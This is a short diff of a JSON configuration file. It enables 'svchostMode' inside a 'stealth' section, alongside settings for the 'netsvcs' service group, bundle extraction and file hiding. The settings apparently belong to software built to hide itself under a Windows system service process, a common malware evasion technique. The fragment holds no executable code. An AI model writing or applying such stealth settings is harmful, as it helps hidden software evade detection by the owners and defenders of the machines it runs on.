@@ -37,7 +37,7 @@
   },
   "stealth": {
     "enabled": true,
-    "svchostMode": false,
+    "svchostMode": true,
     "svchostGroup": "netsvcs",
     "bundleExtract": true,
     "hideFiles": true,
